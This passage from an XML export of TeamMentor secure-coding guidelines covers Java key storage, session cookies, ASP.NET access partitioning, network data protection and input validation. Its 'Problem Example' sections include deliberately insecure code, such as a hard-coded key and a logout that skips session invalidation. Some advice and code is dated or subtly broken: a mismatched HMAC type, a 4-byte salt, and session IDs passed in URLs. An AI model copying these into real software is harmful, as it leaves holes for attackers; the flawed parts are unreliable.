and adding keys to the KeyStore, the 2 passwords can be different<br>// from one another<br>SecretKey skey = (SecretKey)keyStore.getKey(keyName, keyStorePass);</pre></blockquote></li><li><p><strong>Protect the key store.</strong></p><ul><li><strong>Choose a key store directory</strong>: Dedicate a directory for storing your application's key store files. Make sure the directory is not web-accessible. This limits the scope of users&nbsp;who can potentially compromise the contents inside the directory. </li><li><strong>Set appropriate permissions</strong>: Apply filesystem permissions such that the key store files can be only accessed by your application and its administrators.</li></ul></li><li><p><strong>Avoid common mistakes.</strong></p><ul><li><strong>Do not hard-code keys in the application</strong>: Hard-coding the encryption keys into the source code, hoping that an attacker will not reverse engineer the application, is security through obscurity. A determined attacker will usually find a way to defeat such a mechanism. </li><li><strong>Do not place keys into configuration files</strong>: Obfuscating the encryption keys and placing them into configuration files is security through obscurity. A determined attacker will usually find a way to defeat such a mechanism. </li><li><strong>Unload keys from memory after their use</strong>: Leaving the encryption keys in memory after their final use allows the operating system to page them from memory and onto the hard drive. A determined attacker will usually find a way to obtain the encryption keys from the operating system's page file.</li></ul></li></ol><h1>Problem Example</h1><p>The following code shows a hard-coded encryption key inside the application. A determined attacker will be able to compromise the key once they gain access to the source code.</p><blockquote><pre>String encKey = "encryption key";<br>MessageDigest md = MessageDigest.getInstance("SHA-512");<br>md.update(encKey.getBytes("UTF-8"));<br>byte[] rawKey = md.digest();<br>md.reset();<br>SecretKeySpec skeySpec = new SecretKeySpec(rawKey, "AES");</pre></blockquote><h1>Solution Example</h1><p>The following code loads the encryption key from the Java key store. Because the key is properly stored, it is impossible for an attacker to steal the actual key without also stealing the master password.</p><blockquote><pre>String keyStoreName = MyApp.getKeyStoreName();<br>char[] keyStorePass = MyApp.getKeyStorePass(); <br>KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());<br>FileInputStream keyStoreFile = new FileInputStream(keyStoreName);<br>keyStore.load(keyStoreFile, keyStorePass);<br>keyStoreFile.close();<br> final String keyName = "MyAppEncryptionKey";<br>// Note: Although the example uses the same password for storing the KeyStore<br>// on disk and adding keys to the KeyStore, the 2 passwords can be different <br>// from one another<br>SecretKey skey = (SecretKey)keyStore.getKey(keyName, keyStorePass);<br></pre></blockquote><h1>Additional Resources</h1><ul><li>To learn more about storing encryption keys using Java, see: Documentation for <a href="http://download.oracle.com/javase/1.4.2/docs/api/java/security/KeyStore.html">Class KeyStore</a> in Java SDK.</li></ul><h1>Related Items</h1><ul><li><a href="ruledisplay:3D160166-FAEE-4B86-8972-654DC341E322">Attack: Weak Keystore Protection Attack</a> </li><li><a href="ruledisplay:3B657A67-F660-4DB5-9267-6E0FE2DAA1EB">Attack: Chosen Ciphertext Attack</a> </li><li><a href="ruledisplay:DEBB5734-39D0-4922-BDEE-1E0547E22DAD">Attack: Chosen Plaintext Attack</a> </li><li><a href="ruledisplay:24D078E3-A02F-4EDF-A6EA-DA0E3E5FFE5E">Attack: Key Bruteforce Attack</a> </li><li><a href="ruledisplay:E5D7DA05-EB59-46C5-AF9F-BA1B32C783CE">Guideline: Clear Sensitive Data from Memory when No Longer Used (Java Web Application)</a> </li><li><a href="ruledisplay:EA0D0F4E-A363-4777-9F0D-91E8C5042F9C">Guideline: Do Not Store Plaintext Sensitive Data (Java Web Application)</a> </li><li><a href="ruledisplay:197029DD-4692-45C7-8EFF-B0E8760479BC">Guideline: Protect Sensitive Data Inside Configuration Files (Java Web Application)</a></li></ul>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-2125634337" Content_Hash="-1454879260">
    <Metadata>
      <Id>f1ef60f9-6ec3-445d-a624-3a37c970ea41</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Protect Session Cookies</Title>
      <Category>Session Management</Category>
      <Phase>Implementation</Phase>
      <Technology>Java</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><ul><li>Applications written using Servlets or JSP.</li></ul><h1>What to Do</h1><p>Protect the confidentiality of session cookies.</p><h1>Why</h1><p>Session cookies are used by an application to identify the session associated with a particular user. Protecting session cookies can help prevent an attacker from hijacking the session and using the application as a legitimate user.</p><h1>When</h1><p>If your application uses cookies to maintain a user's session state, then use this guideline to protect the cookie.</p><h1>How</h1><p>Use the following steps to secure session cookies:</p><ol><li><p><strong>Do not allow users to choose their own session identifiers. </strong>Java automatically assigns random IDs to its sessions which minimizes the risk of an attacker hijacking another user's session by using the same session ID. To use sessions in Java, invoke <strong>HttpServletRequest.getSession</strong>:</p><blockquote><pre>HttpSession session = request.getSession();</pre></blockquote></li><li><p><strong>Do not reuse sessions. </strong>Always use clean sessions. This prevents old data (possibly from another user) from being disclosed and will help protect the privacy and integrity of user accounts. To create a fresh session, set the boolean flag in <strong>HttpServletRequest.getSession</strong> to true:</p><blockquote><pre>HttpSession session = request.getSession(true);</pre></blockquote></li><li><p><strong>Time-out sessions. </strong>Set an expiration time for sessions. This helps minimize the threat of session hijacking by giving an attacker a smaller window of opportunity. Depending on your application, an appropriate timeout can be anywhere from 10 to 20 minutes. Setting when sessions should expire can be done through <strong>HttpSession.setMaxInactiveInterval</strong>.</p></li><li><p><strong>Allow users to terminate their sessions. </strong>Allowing users to invalidate their sessions reduces the risk of session being hijacked. Use <strong>HttpSession.invalidate</strong> to accomplish this.</p></li><li><p><strong>Track sessions through HTTP referrer. </strong>Tracking sessions through HTTP referrer helps identify when&nbsp;two users are&nbsp;using the same session. In such cases, the session should be invalidated. To detect such behavior, pass the session ID through the URL. Monitor that all pages except the login screen contain the session ID in the HTTP Referer header. Although this technique does not prevent session hijacking completely, it can help minimize the risk of such attack.</p></li><li><p><strong>Ensure cookies are sent over encrypted channels. </strong>Mark cookies sent over SSL as <strong>Secure</strong>. Use <strong>Cookie.setSecure</strong> to require SSL when sending out the given cookie. It is recommended to avoid sending session cookies over unencrypted channels. Use <strong>ServletRequest.isSecure</strong> to verify whether SSL is being used.</p></li></ol><p><strong>Note:</strong> PCI DSS requirements state that sessions that are idle for 15 minutes should be locked automatically and require the user's password to unlock.</p><h1>Problem Example</h1><p>The following code shows the logout function of the <strong>LoginModule</strong> used when relying on JAAS for authentication. The code removes all authentication tokens associated with the current session but fails to invalidate the session. </p><blockquote><pre>public boolean logout() throws LoginException{<br>      subject.getPrincipals().remove(userToken);<br>      succeeded = false;<br>      commitSucceeded = false;<br> <br>      clearCredentials();<br>      userToken = null;<br>      // The application should have invalidated the session here.<br> <br>      // Log the logout event. Consult the Logging section for more details<br> <br>      return true;<br>}</pre></blockquote><h1>Solution Example</h1><p>The following code shows the logout function of the <strong>LoginModule</strong> used when relying on JAAS for authentication. The code removes all authentication tokens associated with the current session and invalidates the session.</p><blockquote><pre>public boolean logout() throws LoginException{<br>      subject.getPrincipals().remove(userToken);<br>      succeeded = false;<br>      commitSucceeded = false;<br> <br>      clearCredentials();<br>      userToken = null;<br> <br>      // The application invalidates the session when<br>      // the user is logging out<br>      HttpSession session = common.getCurrentSession();<br>      session.invalidate();<br> <br>      // Log the logout event. Consult the Logging section for more details<br> <br>      return true;<br>}</pre></blockquote><h1>Additional Resources</h1><ul><li>For more information on HTTP sessions, see: Documentation for <a href="http://download.oracle.com/javaee/1.3/api/javax/servlet/http/HttpSession.html">Interface HttpSession</a> in Java SDK. </li><li>For more information on HTTP cookies, see: Documentation for <a href="http://download.oracle.com/javaee/1.3/api/javax/servlet/http/Cookie.html">Class Cookie</a> in Java SDK. </li><li>To learn more about parameter manipulation and ways to prevent it, see: <a href="http://www.cgisecurity.com/owasp/html/ch11s04.html">Parameter Manipulation</a>. </li><li>To learn more about session prediction attacks, see: <a href="http://www.webappsec.org/projects/threat/classes/credential_session_prediction.shtml">Credential and Session Prediction</a>.</li></ul><h1>Related Items</h1><ul><li><a href="ruledisplay:ED6F49C0-E021-459E-AE4F-9116CA8E8073">Guideline: Use SSL When Transmitting Credentials (Java Web Application)</a> </li><li><a href="ruledisplay:BC10DCE2-CA48-44BF-8BF6-FEFBE8DCCB7E">Attack: Cross Site Scripting Attack</a> </li><li><a href="ruledisplay:3EB8979E-59F0-4C2B-8D8A-CFB173E5D66B">Attack: HTTP Session Hijacking Attack</a> </li><li><a href="ruledisplay:5F929DD7-759F-4412-A9B1-08567CDE9035">Attack: Network Eavesdropping Attack</a> </li><li><a href="ruledisplay:C7E4A74A-9557-43E4-8560-AD3193E3B9EE">Attack: Session Prediction Attack</a> </li><li><a href="ruledisplay:2288423A-5696-41EA-A421-05EAD6460E4C">Attack: Cross Site Request Forgery</a> </li><li><a href="ruledisplay:CBB29250-7ED3-4FDD-9B28-E3EE07EAF911">Attack: HTTP Replay Attack</a> </li><li><a href="ruledisplay:4572037A-2166-4AD1-8E73-D623E468A7B9">Attack: Information Disclosure Attack</a> </li><li><a href="ruledisplay:30448AA0-398E-43CC-A5A1-43A1CA27235E">Checklist Item: Session Cookies are Protected (Java Web Application)</a> </li></ul>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-480390976" Content_Hash="-1788311526">
    <Metadata>
      <Id>f44f4bc9-fb33-41f0-b356-ca73feb44176</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Partition Application Between Public and Private Domains</Title>
      <Category>Authentication</Category>
      <Phase>Deployment</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>What to Do</h1><p>Define a boundary between public and restricted content in both the URL namespace and the filesystem namespace.</p><h1>Why</h1><p>Defining a boundary between public and restricted content simplifies the task of user authorization and is generally less prone to error. When the content is separated, server configuration can be used to automatically apply authorization rules without relying on the developer to explicitly add checks in the code.</p><h1>When</h1><p>Consider using this guideline when your application restricts access to specific resources. For instance, anonymous users are granted access to some, but not all of the application while authenticated users are granted access based on their role.</p><h1>How</h1><p>Defining the boundary requires: </p><ol><li><p><strong>Determine roles</strong>: Define the various types of user and their rights. Build a security policy that documents the rights required to access each page of your application.</p></li><li><p><strong>Determine pages that should require SSL</strong>: This would include pages that transmit credentials, unprotected authentication cookies, or sensitive user information such as credit card or social security numbers. Such pages should be transmitted using SSL only.</p><p>It should be noted that the Forms Authentication cookie is unprotected in the sense that it is vulnerable to HTTP Replay Attacks. As such, any page in a Forms Auth ASP.Net application that requires an authenticated user should only be accessible via SSL.</p></li><li><p><strong>Structure the URL namespace</strong>: Structure the application URL namespace to first separate the pages that require SSL from those that do not. Then define separate directories according to the various roles defined for your application. For instance you might have the following directories under your application root:</p><pre>//secure/usr/secure/admin</pre></li><li><p><strong>Configure IIS to require SSL on the appropriate portions of your application</strong>:</p><ol><li>Right-click on 'My Computer' and select 'Manage </li><li>Under the 'Services and Applications' node, expand 'Internet Information Services' and locate your website </li><li>Right click on the restricted folder and choose 'Properties' </li><li>Click on 'Edit' under the 'Secure Communications' section to require SSL connections. (NOTE: If you have not installed configured a certificate for this server, see the related section for steps to setup SSL on your IIS website)</li></ol></li><li><p><strong>Use absolute URLs to transition to or from the sensitive portion of the namespace</strong>: Relative links use the same protocol (HTTP or HTTPS) as the current page. This can result in broken links that point to pages within your application that require SSL. It can also lead to unnecessary use of SSL, which does have an associated performance hit.</p><p>The fix for both of these issues is to use absolute URLs that explicitly specify the protocol instead of relative URLs. An example redirection using an absolute URL is shown below.</p><pre>private void btnLogon_Click( object sender, System.EventArgs e ){// Form an absolute path using the server name and v-dir namestring serverName = HttpUtility.UrlEncode(Request.ServerVariables["SERVER_NAME"]);string vdirName = Request.ApplicationPath;Response.Redirect("https://" + serverName + vdirName + "/Restricted/Login.aspx");}</pre></li><li><p><strong>Use URL Authorization Restrict Access</strong>: Use an <strong>&lt;authorization&gt;</strong> element to ensure that only authenticated users can access secure pages. Place this element beneath the closing <strong>&lt;/system.web&gt;</strong> tag, as shown here.</p><pre>&lt;!-- The secure folder is for authenticated and SSL access only. --&gt;&lt;location path="Secure" &gt;  &lt;system.web&gt;    &lt;authorization&gt;      &lt;deny users="?" /&gt;    &lt;/authorization&gt;  &lt;/system.web&gt;&lt;/location&gt;</pre><p>Additionally, the following configuration ensures that unauthenticated users are allowed to access pages in the application's root directory. Place this configuration in the main <strong>&lt;system.web&gt;</strong> element.</p><pre>&lt;system.web&gt;  &lt;!-- The virtual directory root folder contains general pages.       Unauthenticated users can view them and they do not need        to be secured with SSL. --&gt;  &lt;authorization&gt;    &lt;allow users="*" /&gt;  &lt;/authorization&gt;&lt;/system.web&gt;</pre><p><strong>Note:</strong> If you use this type of site structure, your application must not rely on the user's identity on the non-SSL pages. In the preceding configuration, no forms authentication ticket is sent for requests for non-SSL pages. As a result, the user is considered anonymous. This has implications for related features, such as personalization, that require the user name.</p></li></ol><h1>Problem Example</h1><p>MyApp is a financial tool that generates reports based on sensitive data. It allows the user to upload the financial data and download the report. Since the application is small, all of its content is located within the same directory. The access control is enforced by the web application through checking the required permissions before a given call is executed.</p><p>Since both data and code is within the same directory, it may be possible for an attacker to gain access to the raw financial data.</p><h1>Solution Example</h1><p>MyApp is a financial tool that generates reports based on some sensitive data. It allows the user to upload the financial data and download the report. The application has a dedicated /data/ directory for the financial data. Access to contents within the /data/ directory is handled by the server hosting MyApp, making it much more difficult for an unauthorized user to gain access.</p><h1>Additional Resources</h1><ul><li>For more information about setting up SSL on your application's web server, visit: <a href="http://msdn2.microsoft.com/en-us/library/aa302411.aspx">How To: Set Up SSL on a Web Server</a>.</li></ul><h1>Related Items</h1><ul><li><a href="ruledisplay:1780A63B-D445-4DA2-94AB-06D0C40CEAC2">Guideline: Separate Account Administration from the Main Application Interface&nbsp;</a> </li><li><a href="ruledisplay:8A2388A7-FC6F-47D1-B45E-C6CAC8511C78">Guideline: Perform Role-Based Security Checks </a></li><li><a href="ruledisplay:14FBF85D-0E97-4CD1-A0EE-D5AA791FA45C">Guideline: Define a Security Policy </a></li><li><a href="ruledisplay:4CFC9E41-67FB-445F-8D5C-1680EF283D45">Guideline: Partition Code Into Separate Assemblies </a></li><li><a href="ruledisplay:EB8D8FDB-1AEB-4923-A8F3-8FF7D90B6B5A">Guideline: Disable Directory Browsing </a></li><li><a href="ruledisplay:1D7F6072-1A5F-472E-9D27-F15E396EAB2E">Attack: Forceful Browsing Attack</a> </li><li><a href="ruledisplay:8D14E285-3827-4005-AE79-1D75B6B2802D">Checklist Item: Application is Partitioned into Public and Private Domains</a> <hr></li></ul><p>Adapted from Microsoft patterns &amp; practices guidance. </p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-1890938551" Content_Hash="812952716">
    <Metadata>
      <Id>fbcc8a28-01fb-4fdf-a0e8-e4704be8d4ec</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Protect Sensitive Data Over the Network</Title>
      <Category>Sensitive Data</Category>
      <Phase>Implementation</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>What to Do</h1><p>Use a protocol that allows adequate encryption to protect sensitive data, such as credentials and application-specific data.</p><h1>Why</h1><p>When data is sent over the network, it typically passes through several intermediate relays on its way towards some final destination. Using a safe protocol to transmit information is important because it adds protection against a <a href="ruledisplay:5F929DD7-759F-4412-A9B1-08567CDE9035">Network Eavesdropping Attack</a> or <a href="ruledisplay:48BB4D3A-9295-4263-B3E7-090E483DEC5D">Man in the Middle Attack</a> during transport.</p><h1>When</h1><p>This is required whenever sensitive data needs to be sent between two hosts, whether it is using the public internet or a private LAN as a transmission medium. Examples include:</p><ul><li>Communication between web browser and application server. </li><li>Communication between application server and database server.</li></ul><h1>How</h1><p>Use the following steps to protect sensitive data over the network:</p><ol><li><p><strong>Identify sensitive information.</strong> Sensitive data is any information that is kept secret and should be disclosed only to authorized parties. Common examples of sensitive data include, but are not limited to, names of customers, government issued ID numbers, credit card and other financial information, passwords, and private keys. Some industries, such as health care and banking, have regulatory standards that define sensitive information. Use regulatory requirements, as they apply to your application, to identify sensitive data. Sensitive data can be defined as follows:</p><ul><li>Information that either contains personally identifiable information or can be used to derive personally identifiable information that should not be shared with others. </li><li>Information that a user provides that they would not want shared with other users of the application. </li><li>Information that comes from an external trusted source that is not designed to be shared with users.</li></ul></li><li><p><strong>Choose an appropriate protection mechanism.</strong> Choosing the appropriate protection mechanism may depend on various conditions: purpose of the sensitive data, role of the other network party, infrastructure, and supported technologies. Because sensitive data must be encrypted when in transit, there are two potential strategies — Encrypt the application data or Encrypt the communication channel:</p><ul><li><p><strong>Encrypt the communication channel.</strong> Depending on the current infrastructure and the other network party, it is possible to encrypt the connections using SSL, IPSec, or any technologies supported by the remote party. For more information, consult the <a href="ruledisplay:AE7F27AF-7253-462F-8A29-6AB2AA202C05">Encrypt Communication Links</a> guideline.</p></li><li><p><strong>Encrypt the application data.</strong> If your application's communication channels cannot be encrypted, encrypt the application data. Hashing or encryption should be used when protecting the application data. Use hashing if the sensitive data will be used only for comparison purposes and the actual contents of the data will never need to be recovered. Use encryption if the sensitive data will need be retrieved at a later stage.</p><ul><li><p><strong>Hashing</strong>: If hashing is used, choose a longer salt, 16 or more bits. The salt is random data that is known only by the application; to guess the value of the original data given the hash, an attacker also has to guess the salt. It is recommended to have a longer salt because it provides a bigger input to the hash function. Assuming that the produced hash is compromised, longer salts makes it more difficult for an attacker to gain access to the sensitive data. If your application uses randomly generated salt, make sure that your application encrypts the random salt and stores it into a configuration file. Use RNGCryptoServiceProvider to generate the salt. Example:</p><pre>public static byte[] GenerateSalt()<br>{<br>    byte[] randBytes = new byte[4];<br>    RNGCryptoServiceProvider gen = new RNGCryptoServiceProvider();<br>    gen.GetNonZeroBytes(randBytes);<br>    return randBytes;<br>}</pre><p>Choosing a strong hashing algorithm is also important. Stronger algorithms prevent multiple unique pieces of data from producing identical hash values. The current recommendation is to use SHA-256 or stronger.</p><pre>public byte[] HashCredentials(byte[] pass, byte[] salt)<br>{<br>    HMACSHA512 md;<br>    byte[] digest; <br>    md = new HMACSHA256(salt);<br>    md.Initialize();<br>    digest = md.ComputeHash(pass);<br>    md.Clear();<br>    return digest;<br>}</pre></li><li><p><strong>Encrypting</strong>: If encryption is used, use a key size of 256-bit or higher for symmetric encryption and 2048-bit or higher for public/private key encryption. Use AES for symmetric encryption or RSA for public/private key encryption. You should use symmetric encryption if and only if your application is the only entity that will access the encrypted data. If the data will be accessed by more than one parties, use public/private key encryption. Public/private key encryption allows your application to share sensitive data with multiple entities without disclosing its own encryption key.</p><pre>Rijndael encMD;ICryptoTransform encCT;<br>byte[] digest;<br>// The following code obtains the encryption key and initialization vector<br>// from the application's key repository. Consult the <a href="ruledisplay:440137A2-948A-4485-A137-E3CC8207F801">Use a Secure Key Storage Location</a><br>// guideline for more details when handling encryption keys.<br>encMD = Rijndael.Create();<br>encMD.Key = MyApp.Crypto.GetEncryptionKey();<br>encMD.IV = MyApp.Crypto.GetEncryptionIV();<br>encCT = encMD.CreateEncryptor(); <br>// Note that sensitiveData is of type byte[] and contains<br>// data that is sensitive in nature<br>digest = encCT.TransformFinalBlock(sensitiveData, 0, sensitiveData.Length);<br>encMD.Clear();</pre></li></ul></li></ul></li><li><p><strong>Apply the appropriate protection mechanism</strong>: Evaluate the code and determine the places where sensitive data is transmitted. Apply the established protection mechanism at each location. For instance, if your application processes credit card transactions across a hostile network environment, encrypt the credit card information before transmitting it to the appropriate network entity:</p><pre>void ProcessPayment(byte[] ccInfo, float amount)<br>{<br>    byte[] ccDigest = MyApp.Crypto.EncryptCCInfo(ccInfo);<br>    SqlConnection connection;<br>    SqlCommand command;<br>    SqlDataReader result;<br>    string query = "execute QueuePayment @ccDigest @amount;";<br>    connection = MyApp.DBManager.GetDBConnection();<br>    command = new SqlCommand(query, connection);<br>    command.Parameters.Add("@ccDigest", System.Data.SqlDbType.Binary);<br>    command.Parameters["@ccDigest"].Value = ccDigest;<br>    command.Parameters.Add("@amount", System.Data.SqlDbType.Float);<br>    command.Parameters["@amount"].Value = amount;<br>    ...<br>}</pre></li></ol><h1>Problem Example</h1><p>An e-commerce application written in ASP.NET enables customers to pay their bills online through a unified broker. The application's web component relies on an independent account management system that resides on another server. The web component communicates with the account management system using a SQL socket connection. The two servers are located in a competitively priced data center that houses a number of other customers, all of which are able to access the building at all times. A malicious user purchases hosting services at the same company, and after exploring the hosting environment, learns that the hosted accounts are networked using a shared bus topology that allows for network snooping. Because SQL connections are not encrypted by default, the attacker is able to setup a sniffer and capture all of the communication between the account management component and the web component. This enabled the attacker to login as a legitimate user on the account management server and make changes at will.</p><h1>Solution Example</h1><p>An e-commerce application written in ASP.NET enables customers to pay their bills online through a unified broker. The application's web component relies on an independent account management system that resides on another server. The web component communicates with the account management system using a SQL socket connection. The two servers are located in a competitively priced data center that houses a number of other customers, all of which are able to access the building at all times. The application's developers encrypt the payment information before transmitting it to the other network entity.</p><pre>void ProcessPayment(byte[] ccInfo, float amount)<br>{<br>    byte[] ccDigest = MyApp.Crypto.EncryptCCInfo(ccInfo);<br>    SqlConnection connection;<br>    SqlCommand command;<br>    SqlDataReader result; <br>    string query = "execute QueuePayment @ccDigest @amount;";<br>    connection = MyApp.DBManager.GetDBConnection();<br>    command = new SqlCommand(query, connection);<br>    command.Parameters.Add("@ccDigest", System.Data.SqlDbType.Binary);<br>    command.Parameters["@ccDigest"].Value = ccDigest;<br>    command.Parameters.Add("@amount", System.Data.SqlDbType.Float);<br>    command.Parameters["@amount"].Value = amount;<br>    ...<br>} <br>... <br>public byte[] EncryptCCInfo(byte[] ccInfo)<br>{<br>    Rijndael encMD;<br>    ICryptoTransform encCT;<br>    byte[] digest;<br>    encMD = Rijndael.Create();<br>    encMD.Key = MyApp.Crypto.GetEncryptionKey();<br>    encMD.IV = MyApp.Crypto.GetEncryptionIV();<br>    encCT = encMD.CreateEncryptor();<br>    digest = encCT.TransformFinalBlock(ccInfo, 0, ccInfo.Length);<br>    encMD.Clear();<br>    return digest;<br>}</pre><p>Because data between the two components is encrypted, the transmission medium is less likely to affect the application's ability to securely transmit payment information.</p><h1>Additional Resources</h1><li>For more information on using IPSec between two servers, see: <a href="http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnnetsec/html/SecNetHT18.asp">Use IPSec to Provide Secure Communication Between Two Servers</a> </li><li>For more information on using IPSec filtering, see: <a href="http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnnetsec/html/HTUseIPSec.asp">Use IPSec for Filtering Ports and Authentication</a> </li><li>For more information on IPSec policies, see: <a href="http://support.microsoft.com/kb/816521">Use IPSec Policy to Secure Terminal Services Communications in Windows Server 2003</a> </li><li>For more information on using SSL with SQL Server, see: <a href="http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnnetsec/html/SecNetHT19.asp">Use SSL to Secure Communication with SQL Server</a> </li><li>For more information on setting up SSL, see: <a href="http://msdn2.microsoft.com/en-us/library/ms181053(VS.80).aspx">Set Up Secure Sockets Layer (SSL)</a> <h1>Related Items</h1><ul><li><a href="ruledisplay:AE7F27AF-7253-462F-8A29-6AB2AA202C05">Guideline: Encrypt Communication Links </a></li><li><a href="ruledisplay:440137A2-948A-4485-A137-E3CC8207F801">Guideline: Use a Secure Key Storage Location </a></li><li><a href="ruledisplay:B9E7568A-907C-43C9-9CED-F0CCA09F76CB">Guideline: Use SSL When Transmitting Credentials </a></li><li><a href="ruledisplay:13EE90D9-B0F6-45D6-913A-BA8527525A04">Attack: Traffic Analysis Attack</a> </li><li><a href="ruledisplay:4572037A-2166-4AD1-8E73-D623E468A7B9">Attack: Information Disclosure Attack</a> </li><li><a href="ruledisplay:B47A6486-A73E-44B9-AD17-1F7F94199828">Attack: Network Credential Sniffing Attack</a> </li><li><a href="ruledisplay:5F929DD7-759F-4412-A9B1-08567CDE9035">Attack: Network Eavesdropping Attack</a> </li><li><a href="ruledisplay:48BB4D3A-9295-4263-B3E7-090E483DEC5D">Attack: Man in the Middle Attack</a> </li><li><a href="ruledisplay:09E595AD-36E7-4E36-B34C-7321C8445887">Checklist Item: Sensitive Data is Protected Over the Network </a></li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance. </p></li>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="1001374877" Content_Hash="257120957">
    <Metadata>
      <Id>fc0b1787-0663-4625-88ac-8e71e2975a36</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Constrain, Reject, and Sanitize Input</Title>
      <Category>Input and Data Validation</Category>
      <Phase>Design</Phase>
      <Technology> Any</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><ul><li><div>Web Application</div></li></ul><h1>What to Do</h1><p>Check for known good data by validating for type, length, format, and range. Reject known bad input and then sanitize the input.</p><h1>Why</h1><p>There are no assumptions of trust that can be made regarding the safety of unchecked input. Most application-level attacks involve malicious input. Failure to validate input means that data could contain database injection attacks.</p><h1>When</h1><p>All applications should constrain and sanitize their input.</p><h1>How</h1><p>The preferred approach to validating input is to constrain what you allow from the beginning. It is much easier to validate data for known valid types, patterns, and ranges than it is to validate data by looking for known bad characters. When you design your application, you know what your application expects. The range of valid data is generally a more finite set than potentially malicious input. However, for defense in depth you may also want to reject known bad input and then sanitize the input. The recommended strategy is shown in Figure 4.4.</p><p><strong><em>Input validation strategy: constrain, reject, and sanitize input</em></strong></p><p>To create an effective input validation strategy, be aware of the following approaches and their tradeoffs: </p><ul><li><strong>Constrain input</strong>. </li><li><strong>Validate data for type, length, format, and range</strong>. </li><li><strong>Reject known bad input</strong>. </li><li><strong>Sanitize input</strong>. </li></ul><h2>Constrain Input</h2><p>Constraining input is about allowing good data. This is the preferred approach. The idea here is to define a filter of acceptable input by using type, length, format, and range. Define what is acceptable input for your application fields and enforce it. Reject everything else as bad data.</p><p>Constraining input may involve setting character sets on the server so that you can establish the canonical form of the input in a localized way.</p><h2>Validate Data for Type, Length, Format, and Range</h2><p>Use strong type checking on input data wherever possible, for example, in the classes used to manipulate and process the input data and in data access routines. For example, use parameterized stored procedures for data access to benefit from strong type checking of input fields.</p><p>String fields should also be length checked and in many cases checked for appropriate format. For example, ZIP codes, personal identification numbers, and so on have well defined formats that can be validated using regular expressions. Thorough checking is not only good programming practice; it makes it more difficult for an attacker to exploit your code. The attacker may get through your type check, but the length check may make executing his favorite attack more difficult.</p><h2>Reject Known Bad Input</h2><p>Deny "bad" data; although do not rely completely on this approach. This approach is generally less effective than using the "allow" approach described earlier and it is best used in combination. To deny bad data assumes your application knows all the variations of malicious input. Remember that there are multiple ways to represent characters. This is another reason why "allow" is the preferred approach.</p><p>While useful for applications that are already deployed and when you cannot afford to make significant changes, the "deny" approach is not as robust as the "allow" approach because bad data, such as patterns that can be used to identify common attacks, do not remain constant. Valid data remains constant while the range of bad data may change over time.</p><h2>Sanitize Input</h2><p>Sanitizing is about making potentially malicious data safe. It can be helpful when the range of input that is allowed cannot guarantee that the input is safe. This includes anything from stripping a null from the end of a user-supplied string to escaping out values so they are treated as literals.</p><p>Another common example of sanitizing input in Web applications is using URL encoding or HTML encoding to wrap data and treat it as literal text rather than executable script. <strong>HtmlEncode</strong> methods escape out HTML characters, and <strong>UrlEncode</strong> methods encode a URL so that it is a valid URI request.</p><h3>In Practice</h3><p>The following are examples applied to common input fields, using the preceding approaches: </p><ul><li><strong>Last</strong> <strong>Name field</strong>. This is a good example where constraining input is appropriate In this case, you might allow string data in the range ASCII A-Z and a-z, and also hyphens and curly apostrophes (curly apostrophes have no significance to SQL) to handle names such as O'Dell. You would also limit the length to your longest expected value. </li><li><strong>Quantity field</strong>. This is another case where constraining input works well. In this example, you might use a simple type and range restriction. For example, the input data may need to be a positive integer between 0 and 1000. </li><li><strong>Free-text field</strong>. Examples include comment fields on discussion boards. In this case, you might allow letters and spaces, and also common characters such as apostrophes, commas, and hyphens. The set that is allowed does not include less than and greater than signs, brackets, and braces. <p>Some applications might allow users to mark up their text using a finite set of script characters, such as bold "&lt;b&gt;", italic "&lt;i&gt;", or even include a link to their favorite URL. In the case of a URL, your validation should encode the value so that it is treated as a URL. </p><p>For more information about validating free text fields, see "Input Validation" in Chapter 10, "<a href="http://msdn.microsoft.com/library/en-us/dnnetsec/html/THCMCh10.asp">Building Secure ASP.NET Pages and Controls</a>." </p></li><li><strong>An existing Web application that does not validate user input</strong>. In an ideal scenario, the application checks for acceptable input for each field or entry point. However, if you have an existing Web application that does not validate user input, you need a stopgap approach to mitigate risk until you can improve your application's input validation strategy. While neither of the following approaches ensures safe handling of input, because that is dependent on where the input comes from and how it is used in your application, they are in practice today as quick fixes for short-term security improvement: <ul><li><strong>HTML-encoding and URL-encoding user input when writing back to the client</strong>. In this case, the assumption is that no input is treated as HTML and all output is written back in a protected form. This is sanitization in action. </li><li><strong>Rejecting malicious script characters</strong>. This is a case of rejecting known bad input. In this case, a configurable set of malicious characters is used to reject the input. As described earlier, the problem with this approach is that bad data is a matter of context. </li></ul></li></ul><p>For more information and examples of input coding, using regular 